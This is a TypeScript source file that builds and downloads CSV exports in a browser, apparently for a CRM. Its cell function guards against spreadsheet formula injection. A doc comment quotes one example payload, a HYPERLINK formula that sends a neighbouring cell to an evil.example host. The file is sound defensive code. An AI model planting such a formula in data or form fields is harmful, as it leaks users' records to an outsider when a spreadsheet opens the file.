// Client-side CSV export. No backend needed — builds a CSV string from rows and
// a column spec, then triggers a download.
//
// Columns are split by a comma, or by a semicolon for a workspace that chose it (Settings,
// Regional; useCsvSeparator reads it): Excel set up for Switzerland splits a CSV it opens on
// semicolons, so a comma file opened there is one long column.

export interface CsvColumn<T> {
  header: string;
  value: (row: T) => string | number | null | undefined;
}

/** UTF-8 byte-order mark (U+FEFF) so Excel opens the file with the right encoding. */
const BOM = String.fromCharCode(0xfeff);

/** What splits a file's columns. */
export type CsvSeparator = ',' | ';';

/**
 * One CSV cell. Every export goes through this, so all of them are safe to open
 * in a spreadsheet.
 *
 * A spreadsheet runs a cell that starts with = + - or @ as a formula, and a
 * leading tab or carriage return can hide that start. Names, emails and notes
 * reach the CRM from public forms and webhooks, so a "name" such as
 * =HYPERLINK("https://evil.example/?d="&B2,"Open") became a live link that sent
 * the next cell to a stranger when a colleague opened the export. A leading
 * quote makes the spreadsheet show it as text. Only strings get it: a real
 * number, -5 say, stays a number.
 */
export function csvCell(v: string | number | boolean | null | undefined, separator: CsvSeparator = ','): string {
  if (v == null) return '';
  let s = String(v);
  if (typeof v === 'string' && /^[=+\-@\t\r]/.test(s)) s = `'${s}`;
  // Quote when the value contains the separator, a quote, or a line break; double inner quotes.
  if (s.includes(separator) || /["\n\r]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
  return s;
}

export function toCsv<T>(rows: T[], columns: CsvColumn<T>[], separator: CsvSeparator = ','): string {
  const head = columns.map((c) => csvCell(c.header, separator)).join(separator);
  const body = rows.map((r) => columns.map((c) => csvCell(c.value(r), separator)).join(separator)).join('\n');
  return `${head}\n${body}`;
}

export function downloadCsv<T>(filename: string, rows: T[], columns: CsvColumn<T>[], separator: CsvSeparator = ','): void {
  const csv = toCsv(rows, columns, separator);
  downloadFile(new Blob([BOM + csv], { type: 'text/csv;charset=utf-8;' }), filename.endsWith('.csv') ? filename : `${filename}.csv`);
}

/** Save a file the server wrote (an export), under this name. */
export function downloadFile(blob: Blob, filename: string): void {
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}
